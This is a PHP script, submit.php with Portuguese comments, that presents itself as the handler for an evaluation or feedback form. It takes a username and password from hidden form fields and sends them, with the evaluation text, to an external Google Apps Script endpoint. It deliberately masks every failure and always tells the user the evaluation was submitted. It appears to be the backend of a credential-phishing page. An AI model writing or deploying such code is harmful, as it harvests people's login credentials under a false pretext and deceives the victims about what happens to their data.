<?php
// submit.php

// URL do seu Google Apps Script
$appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzK-yZEAyED-oU_MT0m68Aac4_Mkn8oBc2di-eN91lxSTFPlrHloHizC0M8eLlYh3Ff/exec';

// Captura os dados do formulário
$username = $_POST['username_field_hidden'] ?? '';
$password = $_POST['password_field_hidden'] ?? '';
$evaluation = $_POST['evaluation_field'] ?? '';

// Prepara os dados para enviar como JSON
$data = [
    'username' => $username,
    'password' => $password,
    'evaluation' => $evaluation
];

$payload = json_encode($data);

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/json\r\n" .
                     "Content-Length: " . strlen($payload) . "\r\n",
        'content' => $payload,
        'ignore_errors' => true // Permite ler respostas mesmo em caso de erro HTTP (ex: 400)
    ]
];

$context = stream_context_create($options);
$response = file_get_contents($appsScriptUrl, false, $context);

// --- ATENÇÃO: CONTINUA MASKARANDO ERROS PARA O FRONT-END ---

if ($response !== false) {
    $response_data = json_decode($response, true);

    if (isset($response_data['status']) && $response_data['status'] === 'success') {
        error_log("Apps Script Response (Success): " . $response);
        header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! Agradecemos sua colaboração."));
        exit;
    } else {
        error_log("Apps Script Response (Error Masked): " . $response);
        header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Houve um aviso na comunicação)"));
        exit;
    }
} else {
    error_log("Erro ao enviar dados via file_get_contents()");
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Erro silencioso na comunicação)"));
    exit;
}
?>
